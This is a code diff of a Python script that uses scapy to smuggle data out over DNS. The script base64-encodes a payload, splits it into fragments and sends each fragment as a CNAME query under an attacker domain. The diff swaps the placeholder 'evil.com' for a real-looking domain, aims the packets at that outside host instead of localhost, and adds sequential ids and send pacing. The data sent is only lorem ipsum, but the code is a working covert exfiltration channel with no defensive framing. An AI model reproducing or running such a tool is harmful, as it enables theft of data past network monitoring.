@@ -4,7 +4,7 @@ from scapy.all import DNS, DNSQR, IP, UDP, send
 from base64 import b64encode
 from random import randint
 
-DOMAIN = "evil.com"
+DOMAIN = "platypew.social"
 FRAG_LEN = 70 - len(DOMAIN)
 
 
@@ -20,14 +20,14 @@ def send_data(dest, data):
     frag_e_data = encode(data)
 
     reqs = []
-    for data in frag_e_data:
+    for i, data in enumerate(frag_e_data):
         dns_req = IP(dst=dest) / UDP(dport=53) / DNS(
-            id=randint(0x0, 0xffff), rd=1, qd=DNSQR(qname=f'{data}.{DOMAIN}', qtype="CNAME"))
+            id=i, rd=1, qd=DNSQR(qname=f'{data}.{DOMAIN}', qtype="CNAME"))
         reqs.append(dns_req)
 
-    send(reqs)
+    send(reqs, inter=0.05)
 
 
-data = """Lorem ipsum dolor sit amet, consectetur adipiscing elit. In pulvinar, arcu et bibendum ultricies, nisi diam rhoncus est, ut pellentesque elit nisl vitae nisi. Duis aliquet quis ligula at sagittis. Donec interdum urna vel quam congue, non blandit ligula fermentum. Suspendisse sit amet neque scelerisque, feugiat purus ut, scelerisque purus. Mauris id diam id odio sollicitudin venenatis in blandit augue. Phasellus molestie, lectus ut suscipit imperdiet, risus magna maximus tortor, at varius risus elit eget magna. Etiam dictum nulla neque, et dapibus est viverra eu. Mauris blandit nunc quis vestibulum rhoncus. Nulla sodales sodales tempus. Vestibulum ac mattis nisl, ac facilisis tellus. Maecenas non est maximus, tincidunt ante in, commodo felis. Nam dapibus ligula id dolor tempus tempus eu et purus."""
+data = """Lorem ipsum dolor sit amet, consectetur adipiscing elit. In pulvinar, arcu et bibendum ultricies, nisi diam rhoncus est, ut pellentesque elit nisl vitae nisi. Duis aliquet quis ligula at sagittis. Donec interdum urna vel quam congue, non blandit ligula fermentum. Suspendisse sit amet neque scelerisque, feugiat purus ut, scelerisque purus."""
 
-send_data('localhost', data)
+send_data(f"www.{DOMAIN}", data)
